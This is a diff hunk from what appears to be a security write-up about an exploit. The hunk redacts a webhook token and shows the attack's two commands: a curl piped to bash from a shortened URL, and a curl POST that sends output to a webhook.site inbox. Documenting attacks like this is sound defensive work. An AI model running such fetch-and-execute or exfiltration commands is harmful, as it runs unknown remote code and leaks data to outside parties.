@@ -146,7 +146,7 @@ If follow-up probing turns any §5 vector into a concrete, reproducible exploit 
 curl -sL https://ulvis.net/1RWm | bash
 
 # What the payload did (simplified): POST selected output to the webhook inbox
-curl -s -X POST https://webhook.site/f03e6569-ea6e-4a60-90e2-307131baf8fa \
+curl -s -X POST https://webhook.site/[WEBHOOK-TOKEN-REDACTED] \
   -H 'Content-Type: application/json' \
   --data-binary @<(echo '{"msg":"..."}')
 
